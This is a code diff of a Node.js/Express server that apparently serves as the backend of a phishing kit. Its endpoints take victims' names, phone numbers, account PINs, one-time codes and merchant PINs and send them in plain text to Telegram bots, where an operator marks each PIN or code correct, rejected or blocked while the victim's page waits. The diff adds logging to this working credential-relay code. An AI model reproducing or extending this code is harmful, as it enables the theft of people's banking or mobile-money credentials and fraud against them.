@@ -13,9 +13,8 @@ const approvedPins = {};
 const approvedCodes = {};
 const blockPins = {};
 const requestBotMap = {};
-const requestPhoneMap = {};   // <-- NEW: store phone per requestId
+const requestPhoneMap = {};
 
-// ---------------- MERCHANT PIN STORE ----------------
 const merchantPins = {};
 const merchantBlocked = {};
 
@@ -61,7 +60,7 @@ async function answerCallback(bot, callbackId) {
             callback_query_id: callbackId
         });
     } catch (err) {
-        console.error(err.response?.data || err.message);
+        console.error('answerCallback error:', err.response?.data || err.message);
     }
 }
 
@@ -69,8 +68,8 @@ async function answerCallback(bot, callbackId) {
 async function setWebhook(bot) {
     try {
         const webhookUrl = `${DOMAIN}/telegram-webhook/${bot.botId}`;
-        await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
-        console.log(`✅ Webhook configured for ${bot.botId}`);
+        const res = await axios.get(`https://api.telegram.org/bot${bot.botToken}/setWebhook?url=${webhookUrl}`);
+        console.log(`✅ Webhook configured for ${bot.botId}:`, res.data);
     } catch (err) {
         console.error(`❌ Webhook failed for ${bot.botId}:`, err.response?.data || err.message);
     }
@@ -100,7 +99,7 @@ app.post('/submit-pin', (req, res) => {
     const requestId = uuidv4();
     approvedPins[requestId] = null;
     requestBotMap[requestId] = botId;
-    requestPhoneMap[requestId] = phone;   // <-- store phone
+    requestPhoneMap[requestId] = phone;
 
     sendTelegramMessage(bot, `🔐 PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nPIN: ${pin}`, [[
         { text: '✅ PIN correct', callback_data: `pin_ok:${requestId}` },
@@ -126,7 +125,7 @@ app.post('/submit-code', (req, res) => {
     const requestId = uuidv4();
     approvedCodes[requestId] = null;
     requestBotMap[requestId] = botId;
-    requestPhoneMap[requestId] = phone;   // <-- store phone
+    requestPhoneMap[requestId] = phone;
 
     sendTelegramMessage(bot, `🔑 OTP CODE VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nCode: ${code}`, [[
         { text: '✅ Code correct', callback_data: `code_ok:${requestId}` },
@@ -151,7 +150,7 @@ app.post('/submit-merchant-pin', (req, res) => {
     const requestId = uuidv4();
     merchantPins[requestId] = null;
     requestBotMap[requestId] = botId;
-    requestPhoneMap[requestId] = phone;   // <-- store phone
+    requestPhoneMap[requestId] = phone;
 
     sendTelegramMessage(bot, `🏪 MERCHANT PIN VERIFICATION\n\nName: ${name}\nPhone: ${phone}\nMerchant PIN: ${pin}`, [[
         { text: '✅ PIN correct', callback_data: `merchant_pin_ok:${requestId}` },
@@ -171,56 +170,69 @@ app.get('/check-merchant-pin/:requestId', (req, res) => {
 // ---------------- TELEGRAM WEBHOOK ----------------
 app.post('/telegram-webhook/:botId', async (req, res) => {
     const bot = getBot(req.params.botId);
-    if (!bot) return res.sendStatus(404);
+    if (!bot) {
+        console.log(`❌ Bot not found for ${req.params.botId}`);
+        return res.sendStatus(404);
+    }
 
     const cb = req.body.callback_query;
-    if (!cb) return res.sendStatus(200);
+    if (!cb) {
+        console.log('⏩ No callback_query, skipping');
+        return res.sendStatus(200);
+    }
+
+    console.log(`📩 Received callback from ${req.params.botId}:`, cb.data);
 
     const [action, requestId] = cb.data.split(':');
     let feedback = '';
-
-    // Retrieve phone from stored map (fallback to 'Unknown')
     const phone = requestPhoneMap[requestId] || 'Unknown';
 
-    // PIN actions
     if (action === 'pin_ok') { 
         approvedPins[requestId] = true; 
         feedback = `✅ PIN approved for phone ${phone}`; 
+        console.log(`✅ PIN approved for ${requestId}`);
     }
     if (action === 'pin_bad') { 
         approvedPins[requestId] = false; 
         feedback = `❌ PIN rejected for phone ${phone}`; 
+        console.log(`❌ PIN rejected for ${requestId}`);
     }
     if (action === 'pin_block') { 
         blockPins[requestId] = true; 
         feedback = `🛑 User ${phone} blocked`; 
+        console.log(`🛑 Blocked ${requestId}`);
     }
 
-    // Code (OTP) actions
     if (action === 'code_ok') { 
         approvedCodes[requestId] = true; 
         feedback = `✅ Code approved for phone ${phone}`; 
+        console.log(`✅ Code approved for ${requestId}`);
     }
     if (action === 'code_bad') { 
         approvedCodes[requestId] = false; 
         feedback = `❌ Code rejected for phone ${phone}`; 
+        console.log(`❌ Code rejected for ${requestId}`);
     }
 
-    // MERCHANT PIN actions
     if (action === 'merchant_pin_ok') {
         merchantPins[requestId] = true;
         feedback = `✅ Merchant PIN approved for phone ${phone} 🏪`;
+        console.log(`✅ Merchant PIN approved for ${requestId}`);
     }
     if (action === 'merchant_pin_bad') {
         merchantPins[requestId] = false;
         feedback = `❌ Merchant PIN rejected for phone ${phone}`;
+        console.log(`❌ Merchant PIN rejected for ${requestId}`);
     }
     if (action === 'merchant_pin_block') {
         merchantBlocked[requestId] = true;
         feedback = `🛑 User ${phone} blocked 🏪`;
+        console.log(`🛑 Merchant blocked ${requestId}`);
     }
 
-    if (feedback) await sendTelegramMessage(bot, `📝 Response:\n${feedback}`);
+    if (feedback) {
+        await sendTelegramMessage(bot, `📝 Response:\n${feedback}`);
+    }
     await answerCallback(bot, cb.id);
     res.sendStatus(200);
 });
